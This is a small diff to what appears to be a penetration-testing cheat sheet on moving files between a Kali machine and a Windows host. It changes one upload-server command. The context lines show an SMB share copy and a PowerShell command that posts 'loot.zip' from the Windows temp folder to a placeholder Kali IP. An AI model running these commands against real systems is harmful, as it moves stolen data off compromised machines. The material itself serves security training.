@@ -490,7 +490,7 @@ kali> impacket-smbserver -smb2support <sharename> .
 win> copy file \\KaliIP\sharename
 ```
 ```powershell
-python3 -m uploadserver 8000
+uploadserver 8000
 Invoke-WebRequest -Uri http://<KALI_IP>:8000/upload -Method POST -InFile C:\Windows\Temp\loot.zip
 ```
 
